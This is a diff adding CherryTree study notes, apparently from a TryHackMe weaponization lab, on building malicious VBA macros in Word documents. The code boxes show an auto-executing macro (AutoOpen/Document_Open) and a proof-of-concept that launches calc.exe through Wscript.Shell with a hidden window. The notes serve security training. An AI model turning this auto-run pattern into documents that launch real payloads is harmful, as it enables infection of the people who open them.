@@ -1,0 +1,62 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Visual Basic for Application - VBA" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707380794" ts_lastsave="1707381865">
+    <rich_text scale="h2" weight="heavy">Visual Basic for Application (VBA)</rich_text>
+    <rich_text>
+
+VBA can be used to automate tasks of everythin regarding IO (mouse, keyboard) between a user and an office application. You can also write macros for office, etc..
+→ access Windows API
+→ ....
+
+The following steps describe how to use vba and create malicious documents to exploit a windows system.
+
+1. In Word click on “view” -&gt; “macros” to open the Visual Basic Editor and select “Document 1 (document)” within the dropdown menu next to “Macros in”. Then click on create and the editor should appear:
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Enter following code to open a Messagebox and run it using the F5-key:
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+In order to run the VBA code automatically, we need to add following code:
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+It is important to save the file using a macro-enabled format such as “.doc” or “.docm”.  Save the document as “Word 97-2003 Document”. When opening the document, you have to enable macros in order to run the vba code. Once enabled, the Messagebox is shown.
+
+If we want to execute an executable using a macro inside an office document, we can add the following macro:
+
+
+
+
+
+
+</rich_text>
+    <encoded_png char_offset="538" justification="left" link="" sha256sum="0fe0c3545b55b864d4c00e9038870f1c29b8003d06a76e65b524cb43c647bf89"/>
+    <codebox char_offset="613" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="0" show_line_numbers="0">Sub THM()
+
+  MsgBox ("Welcome to Weaponization Room!")
+  
+End Sub</codebox>
+    <codebox char_offset="692" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="0" show_line_numbers="0">Sub Document_Open()
+  THM
+End Sub
+
+Sub AutoOpen()
+  THM
+End Sub</codebox>
+    <codebox char_offset="1064" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="0" show_line_numbers="0">Sub PoC()
+	Dim payload As String
+	payload = "calc.exe"
+	CreateObject("Wscript.Shell").Run payload,0
+End Sub
+
+</codebox>
+  </node>
+</cherrytree>
